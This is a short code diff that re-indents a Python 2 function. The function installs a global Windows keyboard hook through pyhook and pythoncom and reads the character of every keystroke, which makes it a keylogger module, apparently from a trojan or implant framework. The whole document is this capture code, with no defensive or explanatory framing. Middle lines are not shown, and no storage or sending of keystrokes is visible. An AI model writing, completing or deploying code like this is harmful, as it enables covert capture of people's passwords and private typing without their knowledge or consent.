@@ -1,6 +1,6 @@
 import pyhook, pythoncom, sys
 def run(*args):
-try:    
+  try:    
     print("[*] testing")
     def OnKeyboardEvent(event):
         chr(event.Ascii)
@@ -12,6 +12,6 @@ try:
     hooks_manager.KeyDown = OnKeyboardEvent
     hooks_manager.HookKeyboard()
     pythoncom.PumpMessages()
-except Exception, e:
-    return str(e)
+  except Exception, e:
+      return str(e)
    
